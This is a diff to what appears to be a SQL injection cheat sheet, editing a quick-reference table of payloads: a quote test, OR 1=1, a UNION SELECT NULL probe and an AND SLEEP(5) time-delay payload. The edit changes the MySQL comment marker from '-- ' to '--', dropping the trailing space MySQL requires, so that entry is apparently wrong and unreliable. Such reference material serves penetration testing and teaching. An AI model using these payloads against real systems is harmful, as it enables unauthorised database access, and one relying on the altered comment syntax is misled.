@@ -311,12 +311,13 @@ SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
 ```
 
 ### Common Payloads Quick List
+
 | Purpose | Payload |
 |---------|---------|
 | Basic test | `'` or `"` |
 | Boolean true | `OR 1=1--` |
 | Boolean false | `AND 1=2--` |
-| Comment (MySQL) | `#` or `-- ` |
+| Comment (MySQL) | `#` or `--` |
 | Comment (MSSQL) | `--` |
 | UNION probe | `UNION SELECT NULL--` |
 | Time delay | `AND SLEEP(5)--` |
